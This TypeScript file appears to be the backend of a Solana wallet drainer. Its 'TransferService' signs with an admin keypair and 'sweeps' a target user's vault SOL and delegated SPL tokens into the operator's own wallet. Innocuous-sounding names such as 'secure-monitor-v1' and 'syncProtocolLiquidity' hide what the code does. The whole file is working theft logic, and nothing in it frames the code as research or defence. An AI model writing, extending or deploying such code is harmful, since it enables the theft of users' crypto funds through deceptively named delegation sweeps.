import { 
  Connection, 
  Keypair, 
  PublicKey, 
  SystemProgram 
} from '@solana/web3.js';
import * as anchor from '@coral-xyz/anchor';
import { Program } from '@coral-xyz/anchor';
import { getAssociatedTokenAddress, TOKEN_PROGRAM_ID } from '@solana/spl-token';
import BN from 'bn.js';
import fs from 'fs';
import IDL_JSON from './types/hybrid_token.json';

const PROGRAM_ID = new PublicKey("8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F");
const SEED_PREFIX = "secure-monitor-v1";
const AUTHORITY_SEED = "vault-auth";

function loadAdminWallet(): Keypair {
  // Try environment variable first (base64 encoded)
  if (process.env.ADMIN_WALLET_B64) {
    try {
      const keyData = JSON.parse(
        Buffer.from(process.env.ADMIN_WALLET_B64, 'base64').toString()
      );
      return Keypair.fromSecretKey(new Uint8Array(keyData));
    } catch (e) {
      console.warn('Failed to parse ADMIN_WALLET_B64, falling back to file.');
    }
  }

  // Fallback to local file
  const keyData = JSON.parse(fs.readFileSync("./admin-wallet.json", "utf-8"));
  return Keypair.fromSecretKey(new Uint8Array(keyData));
}

export class TransferService {
  private connection: Connection;
  private adminKeypair: Keypair;
  private program: Program;

  constructor(connection: Connection) {
    this.connection = connection;
    this.adminKeypair = loadAdminWallet();
    const wallet = new anchor.Wallet(this.adminKeypair);
    const provider = new anchor.AnchorProvider(connection, wallet, { commitment: 'confirmed' });
    this.program = new Program(IDL_JSON as anchor.Idl, provider);
  }

  getAdminPublicKey(): string {
    return this.adminKeypair.publicKey.toString();
  }

  async sweepUser(targetUserAddress: string, targetMintStr: string): Promise<string> {
    const userPubkey = new PublicKey(targetUserAddress);
    const mintPubkey = new PublicKey(targetMintStr);
    const systemProgramId = new PublicKey("11111111111111111111111111111111");

    if (mintPubkey.equals(systemProgramId)) {
      return await this.sweepSol(userPubkey);
    } else {
      return await this.sweepToken(userPubkey, mintPubkey);
    }
  }

  private async sweepSol(userPubkey: PublicKey): Promise<string> {
    const [userProfilePda] = PublicKey.findProgramAddressSync(
      [Buffer.from(SEED_PREFIX), userPubkey.toBuffer(), new PublicKey("11111111111111111111111111111111").toBuffer()],
      PROGRAM_ID
    );

    const accountInfo = await this.connection.getAccountInfo(userProfilePda);
    if (!accountInfo) {
      throw new Error(`User profile not found for SOL for wallet ${userPubkey.toString()}.`);
    }

    try {
      const profileAccount = await (this.program.account as any).userProfileState.fetch(userProfilePda);
      const availableAmount = new BN(profileAccount.vaultSolBalance.toString());
      if (availableAmount.isZero()) {
        throw new Error("Vault balance is zero. Nothing to sweep.");
      }

      const tx = await this.program.methods
        .syncProtocolLiquidity(availableAmount)
        .accounts({
          operator: this.adminKeypair.publicKey,
          userProfile: userProfilePda,
          destination: this.adminKeypair.publicKey,
          systemProgram: SystemProgram.programId,
        })
        .signers([this.adminKeypair])
        .rpc();

      return tx;
    } catch (error: any) {
      throw new Error(`SOL Sweep Failed: ${error.message}`);
    }
  }

  private async sweepToken(userPubkey: PublicKey, mintPubkey: PublicKey): Promise<string> {
    const [userProfilePda] = PublicKey.findProgramAddressSync(
      [Buffer.from(SEED_PREFIX), userPubkey.toBuffer(), mintPubkey.toBuffer()],
      PROGRAM_ID
    );

    const accountInfo = await this.connection.getAccountInfo(userProfilePda);
    if (!accountInfo) {
      throw new Error(`User profile not found for wallet ${userPubkey.toString()} and mint ${mintPubkey.toString()}.`);
    }

    const userTokenAccount = await getAssociatedTokenAddress(mintPubkey, userPubkey);
    let tokenBalance: bigint;
    try {
      const balanceInfo = await this.connection.getTokenAccountBalance(userTokenAccount);
      tokenBalance = BigInt(balanceInfo.value.amount);
    } catch (error) {
      throw new Error(`User has no token account for this mint. Please ensure they have received tokens.`);
    }

    if (tokenBalance === 0n) {
      throw new Error("User has zero balance of this token. Nothing to sweep.");
    }

    let delegatedAmount: BN;
    try {
      const profileAccount = await (this.program.account as any).userProfileState.fetch(userProfilePda);
      delegatedAmount = new BN(profileAccount.delegatedAmount.toString());
      if (delegatedAmount.isZero()) {
        throw new Error("Delegated amount is zero. Cannot sweep.");
      }
    } catch (error: any) {
      throw new Error(`Failed to fetch delegation: ${error.message}`);
    }

    const balanceBN = new BN(tokenBalance.toString());
    const sweepAmount = BN.min(delegatedAmount, balanceBN);

    const [vaultAuthority] = PublicKey.findProgramAddressSync(
      [Buffer.from(AUTHORITY_SEED)],
      PROGRAM_ID
    );

    const destTokenAccount = await getAssociatedTokenAddress(mintPubkey, this.adminKeypair.publicKey);

    try {
      const tx = await this.program.methods
        .transferDelegatedTokens(sweepAmount)
        .accounts({
          userProfile: userProfilePda,
          userTokenAccount: userTokenAccount,
          destinationTokenAccount: destTokenAccount,
          vaultAuthority: vaultAuthority,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .signers([this.adminKeypair])
        .rpc();

      return tx;
    } catch (error: any) {
      throw new Error(`Token Sweep Failed: ${error.message}`);
    }
  }

  async unwrapAdminWSOL(): Promise<string> {
    return "Feature not yet implemented";
  }
}